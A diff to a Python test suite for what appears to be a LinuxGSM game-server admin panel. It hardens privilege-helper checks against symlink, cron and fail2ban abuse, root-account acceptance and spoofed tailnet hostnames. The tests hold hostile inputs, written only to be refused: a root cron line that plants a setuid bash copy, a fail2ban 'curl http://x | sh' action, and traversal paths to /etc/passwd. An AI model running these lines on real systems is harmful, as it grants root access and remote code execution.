@@ -91,7 +91,7 @@ check("no route flashes an exception's text to the browser (py/stack-trace-expos
 _sent = []
 
 
-def _fake_post(url, data, headers):
+def _fake_post(url, data, headers, **_kw):
     _sent.append((url, json.loads(data.decode()), headers))
     return True, "sent"
 
@@ -125,10 +125,10 @@ try:
 
     # The failure reasons must be distinguishable — "can't reach Discord" and "Discord said no" are
     # different problems for whoever is debugging why an alert never arrived.
-    N._post = lambda u, d, h: (False, "unreachable")
+    N._post = lambda u, d, h, **k: (False, "unreachable")
     _ok3, _d3 = N.send_discord(_WH, "hi")
     check("discord: an unreachable host says so", _ok3 is False and "couldn't reach" in _d3, _d3)
-    N._post = lambda u, d, h: (False, "rejected")
+    N._post = lambda u, d, h, **k: (False, "rejected")
     _ok4, _d4 = N.send_discord(_WH, "hi")
     check("discord: a rejected webhook says so instead", _ok4 is False and "rejected it" in _d4, _d4)
 finally:
@@ -343,8 +343,17 @@ check("ssh_manager: no submodule binds another's function by name (the stub seam
 _smg_pkg_stubs = []
 # Built here rather than reusing _STUB_FILES: that is defined further down the file, and a gate
 # that silently depends on statement order is the kind of thing that starts passing vacuously.
+#
+# tools/nosudo_runner.py is in this list because it was the one that got it wrong, and the gate
+# would have caught it the day it was written. It stubbed _run_local, subprocess and
+# _real_subprocess onto the PACKAGE; _core kept the real ones, every internal caller resolved
+# those, and a local privileged command ran REAL sudo while the run's own summary printed
+# "0 refused — this run never tried to escalate". On a developer machine that is pam_faillock
+# counting genuine auth failures against their account — the exact harm the wrapper exists to
+# prevent, with its own reporting saying it had not happened.
 _SMG_STUB_FILES = ["tests/unit_test.py", "tests/smoke_test.py", "tests/rbac_test.py",
-                   "tests/setup_wizard_test.py", "tools/perf_bench.py"]
+                   "tests/setup_wizard_test.py", "tools/perf_bench.py",
+                   "tools/nosudo_runner.py"]
 for _f in _SMG_STUB_FILES:
     _src = open(os.path.join(_root, _f), encoding="utf-8").read()
     _tree = _smg_ast.parse(_src)
@@ -360,6 +369,56 @@ for _f in _SMG_STUB_FILES:
             _smg_pkg_stubs.append("%s:%d %s.%s" % (_f, _n.lineno, _n.value.id, _n.attr))
 check("ssh_manager: no test stubs onto the PACKAGE (it would shadow __getattr__)",
       not _smg_pkg_stubs, "; ".join(_smg_pkg_stubs[:4]))
+
+# The positive half: the no-sudo wrapper must actually INTERCEPT, which the check above cannot
+# say — "does not stub the package" is satisfied by stubbing nothing at all. Run its _install()
+# and confirm the seams it claims. Real sudo is never invoked here: the assertion is that the
+# stub is in place, and _is_sudo is a pure function.
+_nsr_src = open(os.path.join(_root, "tools", "nosudo_runner.py"), encoding="utf-8").read()
+_nsr_ns = {"__name__": "nsr_probe", "__file__": os.path.join(_root, "tools", "nosudo_runner.py")}
+exec(compile(_nsr_src.split("if __name__ ==")[0], "nosudo_runner.py", "exec"), _nsr_ns)   # nosec
+_nsr_ns["_install"]()
+from panel.ops.ssh_manager import _core as _nsr_core, cron as _nsr_cron, files as _nsr_files
+from panel.ops import system_ops as _nsr_so
+check("no-sudo runner: it stubs the DEFINITION site of _run_local, not just the package",
+      _nsr_core._run_local.__qualname__.startswith("_install"),
+      "_core._run_local is %s" % _nsr_core._run_local.__qualname__)
+check("no-sudo runner: system_ops._run is stubbed too", _nsr_so._run.__qualname__.startswith("_install"))
+_nsr_unshimmed = [m.__name__ for m in (_nsr_core, _nsr_cron, _nsr_files)
+                  if getattr(m, "subprocess", None).__class__.__name__ == "module"]
+check("no-sudo runner: every ssh_manager submodule's subprocess is shimmed",
+      not _nsr_unshimmed, "still real in: %s" % _nsr_unshimmed)
+check("no-sudo runner: ...including _core's separate eventlet handle",
+      _nsr_core._real_subprocess.__class__.__name__ != "module")
+# ONE shim object across the modules, because the real `subprocess` is one object across them and
+# tests reach for it that way: part01 patches _sm_core.subprocess.Popen and then asserts what
+# files.py's Popen was handed. A shim PER MODULE made that assignment land on _core's instance
+# while files.py kept its own, so the patch reached nothing and files.py ran the shim's passthrough
+# against a `sudo -n panel-helper` argv — it got /bin/false back and the download checks failed
+# with an empty argv list.
+check("no-sudo runner: the submodules share ONE shim, as they shared one subprocess module",
+      _nsr_core.subprocess is _nsr_files.subprocess is _nsr_cron.subprocess is _nsr_so.subprocess,
+      "core=%r files=%r" % (id(_nsr_core.subprocess), id(_nsr_files.subprocess)))
+# ...but _real_subprocess is a DIFFERENT module (eventlet.patcher's ungreened original), so it
+# needs its own shim over that one. Standing the greened module in for it dropped _POPEN_KW's
+# errors="replace" — eventlet's Popen re-implements communicate() without it — and a game server
+# printing latin-1 came back as ("", "command execution error", -1).
+check("no-sudo runner: _real_subprocess's shim stands over the ORIGINAL module, not the greened one",
+      _nsr_core._real_subprocess is not _nsr_core.subprocess)
+_nsr_latin = _nsr_core._run_local(r"printf 'caf\351: x\n'", timeout=10, sudo=False)
+check("no-sudo runner: ...so undecodable output still comes back as text",
+      _nsr_latin[2] == 0 and _nsr_latin[0].startswith("caf") and "\ufffd" in _nsr_latin[0],
+      repr(_nsr_latin))
+# The shape that escaped: the local privileged path is bash -c "sudo bash -c ...", so a check on
+# argv[0] alone never sees the sudo.
+for _cmd, _want in ((["sudo", "id"], True),
+                    (["/bin/bash", "-c", "sudo bash -c x"], True),
+                    (["/usr/bin/sudo", "id"], True),
+                    ("sudo -n true", True),
+                    (["/bin/bash", "-c", "echo hi"], False),
+                    (["echo", "pseudonym"], False)):
+    check("no-sudo runner: _is_sudo(%r) is %s" % (_cmd, _want),
+          _nsr_ns["_is_sudo"](_cmd) is _want)
 
 # A module-level PRIVATE variable that nothing in its own module reads is dead code to CodeQL
 # (py/unused-global-variable) however many sibling modules import it — `from x import _y` is not a
@@ -397,6 +456,10 @@ check("ssh_manager: every module-private variable is read in its OWN module (Cod
 import pathlib as _tp                                                              # noqa: E402
 _repo = _tp.Path(_UNIT_ROOT)
 _suites = sorted(p.name for p in (_repo / "tests").glob("*_test.py"))
+# Both wiring checks below are "every suite is referenced somewhere". With _suites empty they pass
+# having compared nothing — measured by emptying the glob. A floor, not an inventory.
+check("sweep: the tests/*_test.py scan found suites", len(_suites) >= 6,
+      "%d suites — the two wiring checks below would pass vacuously" % len(_suites))
 _runner = (_repo / "tools" / "run-tests.sh").read_text(encoding="utf-8")
 _missing_runner = [s for s in _suites if s not in _runner]
 check("test wiring: every tests/*_test.py is referenced by tools/run-tests.sh",
@@ -421,8 +484,13 @@ check("test wiring: every suite is measured by the coverage job",
 from app import ALERT_PROVIDERS as _AP                                            # noqa: E402
 from panel.routes.server_files import _ALERT_KEYS as _AK, _ALERT_KEY_SET as _AKS   # noqa: E402
 
+# len() first, both times: `all(... for x in [])` is True, so an emptied ALERT_PROVIDERS or
+# _ALERT_KEYS would pass every structural claim below while the feature was gone.
+check("alert providers: there ARE providers, so the claims below examine some", len(_AP) >= 1)
+check("alert providers: ...and keys", len(_AK) >= 1)
 check("alert providers: every entry has id, label, toggle and fields",
-      all(p.get("id") and p.get("label") and p.get("toggle") and p.get("fields") for p in _AP))
+      _AP and all(p.get("id") and p.get("label") and p.get("toggle") and p.get("fields")
+                  for p in _AP))
 check("alert providers: every toggle is a LinuxGSM <name>alert flag",
       all(p["toggle"].endswith("alert") for p in _AP),
       str([p["toggle"] for p in _AP if not p["toggle"].endswith("alert")]))
@@ -555,10 +623,19 @@ finally:
 from panel.ops import tailscale_integration as TS
 
 for _h in ("100.64.0.1", "100.115.92.7", "fd7a:115c:a1e0::1",
-           "ns106051.taile87e07.ts.net", "box.tail1234.ts.net", "host.taile87e07.example"):
+           "ns106051.taile87e07.ts.net", "box.tail1234.ts.net",
+           "BOX.TAILE87E07.TS.NET"):     # MagicDNS names are case-insensitive
     check("tailnet: %r is recognised" % _h, TS.is_tailscale_ip(_h) is True)
+# The near-misses. The first three used to answer True: `".taile" in host` is an UNANCHORED
+# substring anywhere in the string, and `host.startswith("100.")` is a string prefix rather than
+# a range — so a domain somebody else controls was reported as being on the tailnet, and so was
+# 100.0.0.1, which is a PUBLIC address outside Tailscale's 100.64.0.0/10 CGNAT block.
+# "host.taile87e07.example" was in the recognised list above and should never have been: a
+# MagicDNS name always ends .ts.net.
 for _h in ("10.0.0.1", "192.168.1.5", "1.100.0.1", "203.0.113.9", "example.ts.net.evil.com",
-           "fd7b:115c::1", "", None, "100abc.example.com"):
+           "fd7b:115c::1", "", None, "100abc.example.com",
+           "host.taile87e07.example", "evil.tailed-hosting.example",
+           "100.telemetry.example.com", "100.0.0.1", "100.128.0.1"):
     check("tailnet: %r is NOT taken for a tailnet address" % (_h,), TS.is_tailscale_ip(_h) is False)
 
 # get_magic_url: the port is omitted for the standard ones and appended otherwise, and there is no
@@ -595,8 +672,12 @@ _fixture_shapes = [
 ]
 # The suite is several files now; a gate reading only one of them would stop covering the
 # fixtures in the others while still passing.
-_own = "\n".join(open(_p, encoding="utf-8").read()
-                 for _p in sorted(_pl.Path(_UNIT_ROOT, "tests").rglob("*.py")))
+_own_files = sorted(_pl.Path(_UNIT_ROOT, "tests").rglob("*.py"))
+_own = "\n".join(open(_p, encoding="utf-8").read() for _p in _own_files)
+# ...and this one is "no fixture anywhere looks like a real credential", which an empty sweep
+# satisfies trivially. The suite is several files now, so the count is the thing to assert.
+check("sweep: the tests/**/*.py scan found the suite's own source", len(_own_files) >= 10,
+      "%d files — the credential-shape checks below would pass vacuously" % len(_own_files))
 for _label, _pat in _fixture_shapes:
     _hits = _re_fx.findall(_pat, _own)
     check("fixtures: no test value is shaped like a real %s" % _label, not _hits,
@@ -742,14 +823,23 @@ _probe = (
     "warnings.warn('probe', DeprecationWarning);"
     "print('HEARD' if heard else 'DEAF')" % _root
 )
+# skip(), not check(..., True, "skipped: ..."). The handler set _heard = True on ANY exception —
+# including the 120s TimeoutExpired and any OSError — which is verbatim the pattern skip()'s own
+# docstring forbids: "a green line for a check that never executed". Proven by raising before the
+# subprocess: PASS, 1888/1888, rc=0, no SKIP reported. The except is narrowed to what it claims to
+# be for (a sandbox that forbids subprocess), so a timeout or a crash is a real failure again.
+_probe_ran, _heard, _detail = True, False, ""
 try:
     _out = _sp.run([sys.executable, "-W", "always::DeprecationWarning", "-c", _probe],
                    capture_output=True, text=True, timeout=120, cwd=_root)
     _heard = "HEARD" in _out.stdout
     _detail = (_out.stdout.strip()[-60:] + " " + _out.stderr.strip()[-120:])
-except Exception as _e:            # a sandbox that forbids subprocess shouldn't fail the suite
-    _heard, _detail = True, "skipped: %s" % _e
-check("importing app leaves -W always::DeprecationWarning working", _heard, _detail)
+except (OSError, ValueError) as _e:   # no subprocess at all in this sandbox — not a code failure
+    _probe_ran, _detail = False, repr(_e)
+if _probe_ran:
+    check("importing app leaves -W always::DeprecationWarning working", _heard, _detail)
+else:
+    skip("importing app leaves -W always::DeprecationWarning working", _detail)
 
 # eventlet's own banner IS silenced now — by message, since it is not a DeprecationWarning at all.
 _quiet = _sp.run([sys.executable, "-c", "import sys; sys.path.insert(0, %r); import app" % _root],
@@ -943,6 +1033,54 @@ for _v, _a in _uid0_verbs:
         pass
 check("helper: no verb accepts a uid-0 account", not _uid0_through,
       "still accepted: %s" % _uid0_through)
+# ...and the PANEL's copy of the table must refuse the same names. It did not: twenty slots still
+# held _username, so `remote_command("user-delete", ["root"])` rendered `userdel -r root` and sent
+# it. Locally the helper is the second check; a REMOTE host has no helper, so this copy is the
+# only one there is. The argv-comparison gate above cannot see this — every content verb builds []
+# on both sides, so identical argv says nothing about which names were let through.
+_uid0_panel = []
+for _v, _a in _uid0_verbs:
+    try:
+        _priv.check_args(_v, _a)
+        _uid0_panel.append(_v)
+    except Exception:
+        pass
+check("privileged: the panel's table refuses a uid-0 account everywhere the helper does",
+      not _uid0_panel, "still accepted: %s" % _uid0_panel)
+# The general form, so a verb added later cannot drift the same way: for EVERY verb and every
+# argument slot, if the helper refuses "root" there, the panel must too.
+_slot_drift = []
+for _v in sorted(_helper.VERBS):
+    if _v not in _priv.verbs():
+        continue
+    _hs, _ps = _helper.VERBS[_v][0], _priv.verb_validators(_v)
+    for _i, (_hc, _pc) in enumerate(zip(_hs, _ps)):
+        _hc = _hc.check if isinstance(_hc, _helper.Rest) else _hc
+        _pc = _pc.check if isinstance(_pc, _priv.Rest) else _pc
+        def _takes(_f):
+            try:
+                _f("root")
+                return True
+            except Exception:
+                return False
+        if not _takes(_hc) and _takes(_pc):
+            _slot_drift.append("%s arg%d" % (_v, _i + 1))
+check("privileged: no argument slot is stricter in the helper than in the panel",
+      not _slot_drift, "helper refuses 'root' but the panel does not at: %s" % _slot_drift[:6])
+# The remote grant renders `usermod -aG <group> <user>` from a group name READ OFF THE HOST. The
+# helper checks it against the content user's real primary group; the remote form cannot, so the
+# groups that hand out privilege are refused by name.
+_grp_ok = _priv.remote_command("content-grant-read", ["cu", "cu", "gm", "cstrike"])
+_grp_bad = []
+for _g in ("root", "sudo", "wheel", "docker", "shadow"):
+    try:
+        _priv.remote_command("content-grant-read", ["cu", _g, "gm", "cstrike"])
+        _grp_bad.append(_g)
+    except Exception:
+        pass
+check("privileged: the remote content grant refuses a privileged group", not _grp_bad,
+      "rendered usermod -aG for: %s" % _grp_bad)
+check("privileged: ...and still renders the real one", "usermod -aG cu gm" in _grp_ok, _grp_ok[:60])
 check("helper: _game_home_path refuses uid 0 even if a name got past the validator",
       _helper._game_home_path("root", ".ssh/id_rsa") == (None, None),
       repr(_helper._game_home_path("root", ".ssh/id_rsa")))
@@ -958,6 +1096,239 @@ if _sys_name:
         _sys_why = repr(_sys_exc)
     check("helper: a NON-root system account (uid<1000) is still accepted", not _sys_why,
           "refused %s, which is the shape of the panel's own user: %s" % (_sys_name, _sys_why))
+
+# ── The three content verbs must not be steerable through a symlink ───────────────────────────
+# The GMod shared-content box is the one corner of the helper that works INSIDE a home directory,
+# and a home directory belongs to the account that lives in it. install.sh creates /home/lgsmpanel
+# with `useradd --create-home`, and the panel creates one per game server — so "an attacker who
+# owns a directory under /home for a name v_managed_user accepts" is not a hypothetical, it is the
+# panel's own account and every game server it has ever installed.
+#
+# Each verb is driven for real, with HOME_ROOT redirected at a sandbox. Every attack is paired
+# with the legitimate call it must not break, because a verb that refuses everything is not a fix.
+import grp as _cs_grp
+import stat as _cs_stat
+from panel.ops.ssh_manager import gmod as _sm_gmod  # noqa: E402
+_cs_tmp = _tempfile.mkdtemp(prefix="content-sym-")
+_cs_me = __import__("pwd").getpwuid(os.getuid()).pw_name
+_cs_home_root, _cs_home = os.path.join(_cs_tmp, "home"), os.path.join(_cs_tmp, "home", _cs_me)
+os.makedirs(_cs_home)
+_cs_saved_root, _cs_saved_cron = _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX
+_helper.HOME_ROOT = _cs_home_root
+_helper.CONTENT_CRON_PREFIX = os.path.join(_cs_tmp, "cron.d", "lgsm-gmod-content")
+os.makedirs(os.path.join(_cs_tmp, "cron.d"))
+try:
+    # 1. content-dir-create: makedirs(exist_ok=True) accepts a SYMLINK to a directory (its check is
+    #    isdir, which follows) and the chown/chmod after it followed too — so `ln -s /root
+    #    ~/serverfiles` made root give /root away to the content account.
+    _cs_victim = os.path.join(_cs_tmp, "victim")
+    os.makedirs(_cs_victim)
+    _CS_750 = _cs_stat.S_IRWXU | _cs_stat.S_IRGRP | _cs_stat.S_IXGRP
+    os.chmod(_cs_victim, _CS_750)
+    _cs_sf = os.path.join(_cs_home, _helper.CONTENT_SUBDIR)
+    os.symlink(_cs_victim, _cs_sf)
+    try:
+        _helper.do_content_dir_create([_cs_me], "")
+        _cs_dc_err = ""
+    except OSError as _e:
+        _cs_dc_err = type(_e).__name__
+    check("helper content-dir-create: a symlinked serverfiles is refused, not followed",
+          _cs_dc_err and _cs_stat.S_IMODE(os.stat(_cs_victim).st_mode) == _CS_750,
+          "err=%r victim mode=%s" % (_cs_dc_err,
+                                     oct(_cs_stat.S_IMODE(os.stat(_cs_victim).st_mode))))
+    os.unlink(_cs_sf)
+    _helper.do_content_dir_create([_cs_me], "")
+    _helper.do_content_dir_create([_cs_me], "")        # and it is still idempotent
+    check("helper content-dir-create: ...and a real one is still created 0700",
+          os.path.isdir(_cs_sf) and not os.path.islink(_cs_sf)
+          and _cs_stat.S_IMODE(os.stat(_cs_sf).st_mode) == 0o700,
+          oct(_cs_stat.S_IMODE(os.stat(_cs_sf).st_mode)))
+
+    # 2. content-grant-read: the g+rX walk read the mode with lstat (does not follow) and wrote it
+    #    with chmod (does). A symlink's own mode is 0777, so every link in the tree ended as
+    #    `chmod 0777` on its TARGET — /etc/shadow, /etc/sudoers.d, /etc/cron.d.
+    _cs_tree = os.path.join(_cs_sf, "cstrike")
+    os.makedirs(os.path.join(_cs_tree, "maps"))
+    _cs_real = os.path.join(_cs_tree, "maps", "de_dust2.bsp")
+    with open(_cs_real, "w", encoding="utf-8") as _fh:
+        _fh.write("x")
+    os.chmod(_cs_real, 0o600)
+    _cs_exec = os.path.join(_cs_tree, "run.sh")
+    with open(_cs_exec, "w", encoding="utf-8") as _fh:
+        _fh.write("x")
+    os.chmod(_cs_exec, _cs_stat.S_IRWXU)
+    _cs_tf = os.path.join(_cs_tmp, "shadowish")
+    with open(_cs_tf, "w", encoding="utf-8") as _fh:
+        _fh.write("x")
+    os.chmod(_cs_tf, 0o640)
+    _cs_td = os.path.join(_cs_tmp, "sudoersd")
+    os.makedirs(_cs_td)
+    os.chmod(_cs_td, _cs_stat.S_IRWXU)
+    os.symlink(_cs_tf, os.path.join(_cs_tree, "a"))
+    os.symlink(_cs_td, os.path.join(_cs_tree, "b"))
+    _helper.do_content_grant_read(
+        [_cs_me, _cs_grp.getgrgid(__import__("pwd").getpwnam(_cs_me).pw_gid).gr_name,
+         _cs_me, "cstrike"], "")
+    check("helper content-grant-read: a symlink's 0777 does not land on its target",
+          _cs_stat.S_IMODE(os.stat(_cs_tf).st_mode) == 0o640
+          and _cs_stat.S_IMODE(os.stat(_cs_td).st_mode) == 0o700,
+          "file=%s dir=%s" % (oct(_cs_stat.S_IMODE(os.stat(_cs_tf).st_mode)),
+                              oct(_cs_stat.S_IMODE(os.stat(_cs_td).st_mode))))
+    check("helper content-grant-read: ...and g+rX still reaches the real files",
+          _cs_stat.S_IMODE(os.stat(_cs_real).st_mode) == 0o640
+          and _cs_stat.S_IMODE(os.stat(_cs_exec).st_mode) == 0o750
+          and _cs_stat.S_IMODE(os.stat(_cs_sf).st_mode) & 0o010,
+          "file=%s exec=%s serverfiles=%s"
+          % (oct(_cs_stat.S_IMODE(os.stat(_cs_real).st_mode)),
+             oct(_cs_stat.S_IMODE(os.stat(_cs_exec).st_mode)),
+             oct(_cs_stat.S_IMODE(os.stat(_cs_sf).st_mode))))
+
+    # 3. content-cron-write: its stdin went to /etc/cron.d verbatim. A cron.d line carries a USER
+    #    FIELD, so `* * * * * root <cmd>` was root, within the minute, across reboots — the exact
+    #    hole WRITE_CONTENT closes for node-tools-cron, in the one cron writer that table does not
+    #    reach (the destination is per-user, so it cannot be a fixed name).
+    _cs_cron = "%s-%s" % (_helper.CONTENT_CRON_PREFIX, _cs_me)
+    _cs_rc = _helper.do_content_cron_write(
+        [_cs_me], "* * * * * root cp /bin/bash /tmp/rb && chmod u+s /tmp/rb\n")
+    check("helper content-cron-write: a root cron line is refused",
+          _cs_rc == 2 and not os.path.exists(_cs_cron),
+          "rc=%s exists=%s" % (_cs_rc, os.path.exists(_cs_cron)))
+    _cs_body = _sm_gmod._content_update_cron_body(_cs_me, ["gmodserver", "csgoserver"])
+    _cs_rc = _helper.do_content_cron_write([_cs_me], _cs_body)
+    check("helper content-cron-write: ...and the body the panel actually sends is written verbatim",
+          _cs_rc == 0 and os.path.exists(_cs_cron)
+          and open(_cs_cron, encoding="utf-8").read() == _cs_body, "rc=%s" % _cs_rc)
+    # The user field is pinned to the ARGUMENT, not to whatever the body claims.
+    _cs_rc = _helper.do_content_cron_write(
+        [_cs_me], _cs_body.replace(" 0 %s /home/" % _cs_me, " 0 root /home/", 1))
+    check("helper content-cron-write: the cron user field cannot name anyone but the argument",
+          _cs_rc == 2, "rc=%s" % _cs_rc)
+
+    # 4. gmod-mount-read: opened as root, through a path every component of which lives in that
+    #    account's own home — so a symlinked mount.cfg printed any root-readable file into the UI.
+    #    It goes through the download verbs' fork-and-drop now, so the path is only resolved once
+    #    privileges are gone.
+    _cs_secret = os.path.join(_cs_tmp, "shadow")
+    with open(_cs_secret, "w", encoding="utf-8") as _fh:
+        _fh.write("root:$6$SECRET")
+    _cs_cfg = os.path.join(_cs_home, _helper.GMOD_CFG_SUBPATH)
+    os.makedirs(_cs_cfg)
+    os.symlink(_cs_secret, os.path.join(_cs_cfg, "mount.cfg"))
+    _cs_r, _cs_w = os.pipe()
+    _cs_saved_fd = os.dup(1)
+    os.dup2(_cs_w, 1)
+    os.close(_cs_w)
+    try:
+        _helper.do_gmod_mount_read([_cs_me], "")
+    finally:
+        sys.stdout.flush()
+        os.dup2(_cs_saved_fd, 1)
+        os.close(_cs_saved_fd)
+    _cs_out = os.read(_cs_r, 65536).decode("utf-8", "replace")
+    os.close(_cs_r)
+    check("helper gmod-mount-read: a symlinked mount.cfg does not leak its target",
+          "SECRET" not in _cs_out, repr(_cs_out[:80]))
+    # The read itself: _as_game_user needs root to drop, so the drop is stood in for and what is
+    # checked is that the verb hands it the right path and emits that file.
+    os.unlink(os.path.join(_cs_cfg, "mount.cfg"))
+    with open(os.path.join(_cs_cfg, "mount.cfg"), "w", encoding="utf-8") as _fh:
+        _fh.write('"cstrike" "/home/cu/serverfiles/cstrike"\n')
+    _cs_pw = __import__("pwd").getpwnam(_cs_me)
+    _cs_fake = __import__("pwd").struct_passwd(
+        (_cs_pw.pw_name, _cs_pw.pw_passwd, _cs_pw.pw_uid, _cs_pw.pw_gid, _cs_pw.pw_gecos,
+         _cs_home, _cs_pw.pw_shell))
+    _cs_seen = []
+    _cs_real_pwd, _cs_real_drop = _helper.pwd, _helper._as_game_user
+    _helper.pwd = type("P", (), {"getpwnam": staticmethod(lambda n: _cs_fake)})()
+    _helper._as_game_user = lambda pw, p, emit: (_cs_seen.append(p), emit(os.path.realpath(p)))[0]
+    _cs_r, _cs_w = os.pipe()
+    _cs_saved_fd = os.dup(1)
+    os.dup2(_cs_w, 1)
+    os.close(_cs_w)
+    try:
+        _helper.do_gmod_mount_read([_cs_me], "")
+    finally:
+        sys.stdout.flush()
+        os.dup2(_cs_saved_fd, 1)
+        os.close(_cs_saved_fd)
+        _helper.pwd, _helper._as_game_user = _cs_real_pwd, _cs_real_drop
+    _cs_out = os.read(_cs_r, 65536).decode("utf-8", "replace")
+    os.close(_cs_r)
+    check("helper gmod-mount-read: ...and a real mount.cfg is still read, under the game user",
+          _cs_out == '"cstrike" "/home/cu/serverfiles/cstrike"\n'
+          and _cs_seen == [os.path.join(_cs_cfg, "mount.cfg")],
+          "out=%r handed=%s" % (_cs_out, _cs_seen))
+finally:
+    _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX = _cs_saved_root, _cs_saved_cron
+    _shutil.rmtree(_cs_tmp, ignore_errors=True)
+
+# ── fail2ban's two runnable keys ──────────────────────────────────────────────────────────────
+# These four write targets were allowed wholesale, on the reasoning that fail2ban config is
+# declarative and the COMMANDS live in action.d/*.conf, which is not a write target. Two keys
+# undercut that: a jail's `action` names a definition that fail2ban resolves by joining the value
+# onto "action.d", and filter.d/linuxgsm-panel.conf IS a write target — so `action =
+# ../filter.d/linuxgsm-panel` may load a file the caller just wrote, whose actionstart/actionban
+# fail2ban runs as root on reload. I could not verify that traversal (no fail2ban here to test
+# against), so this is a guard against a maybe — and it costs nothing, because the panel writes
+# none of these keys and a legitimate value is a bare name.
+_helper_src = open(_helper_path, encoding="utf-8").read()
+_f2b_bad = [ln for ln in ("action = ../filter.d/linuxgsm-panel", "banaction = /tmp/evil",
+                          "actionban = curl http://x | sh", "actionstart = /bin/sh -c id",
+                          "banactionallports = ../../x", "filter = ../../etc/passwd",
+                          "chain = ../x")
+            if _helper._fail2ban_line_ok(ln)]
+check("helper fail2ban: a value that names a path is refused for the keys that decide what RUNS",
+      not _f2b_bad, "accepted: %s" % _f2b_bad)
+_f2b_good = [ln for ln in ("action = iptables-multiport", "filter = linuxgsm-panel",
+                           "action_mwl = sendmail-whois-lines", "[linuxgsm-panel]",
+                           "enabled = true", "ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8",
+                           "logpath = /var/log/auth.log",
+                           "failregex = panel login (?:failed|blocked) from <HOST>$")
+             if not _helper._fail2ban_line_ok(ln)]
+check("helper fail2ban: ...and every other key, paths and regexes included, is untouched",
+      not _f2b_good, "refused: %s" % _f2b_good)
+# The bodies the PANEL actually sends have to pass, or the feature is simply broken.
+from panel.ops.ssh_manager import hosts as _f2b_hosts                              # noqa: E402
+_F2B_BODIES = {
+    "fail2ban-panel-jail": _nsr_so._panel_f2b_jail_body("/var/log/auth.log", 5000, ["10.0.0.0/8"]),
+    "fail2ban-panel-filter": _nsr_so._panel_f2b_filter_body(),
+    "fail2ban-jail-local": ("[DEFAULT]\nbantime = 1h\nfindtime = 10m\nmaxretry = 5\n\n"
+                            "[sshd]\nenabled = true\nport = 22\n"),
+    "fail2ban-panel-whitelist": _f2b_hosts._f2b_dropin_ignoreip_body(["10.0.0.0/8", "100.64.0.1"]),
+}
+_f2b_rejected = [n for n, b in _F2B_BODIES.items()
+                 if _helper.WRITE_CONTENT[n] is None
+                 or not _helper._lines_match(b, _helper.WRITE_CONTENT[n])]
+check("helper fail2ban: every body the panel writes is still accepted", not _f2b_rejected,
+      "rejected: %s" % _f2b_rejected)
+
+# ── lgsm-discover reads a user's files AS THAT USER ───────────────────────────────────────────
+# Everything it reads lives inside a /home user's own directory, so every path component is theirs
+# to replace: a symlink at ~/lgsm/config-lgsm/<x>/<x>.cfg made it a port-number oracle over any
+# root-readable file, one at ~/lgsm/backup a directory-entry count, one at
+# ~/lgsm/mods/installed-mods.txt a line count. Same class as the mount.cfg read. The fork-and-drop
+# only engages as root — unprivileged there is no boundary — so what is checked here is that the
+# drop is attempted and that the output is unchanged when it is not.
+import inspect as _disc_inspect
+_disc_src = _disc_inspect.getsource(_helper._discover_user)
+check("helper lgsm-discover: the per-user read drops to that user before reading anything",
+      "os.setgroups([])" in _disc_src and "os.setgid(pw.pw_gid)" in _disc_src
+      and "os.setuid(pw.pw_uid)" in _disc_src and "os.fork()" in _disc_src,
+      "no credential drop in _discover_user")
+check("helper lgsm-discover: ...and it refuses to read if the drop did not take",
+      "os.getuid() != pw.pw_uid or os.geteuid() == 0" in _disc_src
+      and _disc_src.index("os.getuid() != pw.pw_uid") < _disc_src.index("_emit()\n            sys"),
+      "no post-drop state check before the read")
+
+# ── the restore copy pins BOTH directories, not just the file names ───────────────────────────
+# O_NOFOLLOW covers the last component only, so islink(stage) followed by
+# os.path.join(stage, member) was a check on a path and then a use of it: swap `stage` itself for
+# a symlink in that window and root reads <somewhere else>/panel.db over the live one. A
+# descriptor cannot be re-pointed once open.
+check("helper restore: the staging and data directories are opened O_NOFOLLOW once, as fds",
+      "os.O_DIRECTORY | os.O_NOFOLLOW" in _helper_src
+      and "src_dir_fd=sdir, dst_dir_fd=ddir" in _helper_src,
+      "restore_copy_members still joins paths")
 
 # ── The restore must not follow a symlink out of the staging directory ────────────────────────
 # The staging directory is FIXED, and the helper's own note says why that matters: root copying
@@ -1130,8 +1501,11 @@ try:
         _tarbuf.seek(0)
         with _tarfile.open(fileobj=_tarbuf, mode="r|gz") as _tf:
             _members = {m.name: m for m in _tf}
+        check("helper: the archive is not empty, so the layout claim examines members",
+              len(_members) >= 1, "no tar members — the next check would pass vacuously")
         check("helper: the archive has ONE root named after the folder, not the whole host path",
-              all(n == "addons" or n.startswith("addons/") for n in _members), str(sorted(_members)))
+              _members and all(n == "addons" or n.startswith("addons/") for n in _members),
+              str(sorted(_members)))
         eq("helper: nested files keep their relative layout",
            sorted(n for n in _members if n.endswith((".vpk", ".txt"))),
            ["addons/a.vpk", "addons/sub/b.txt"])
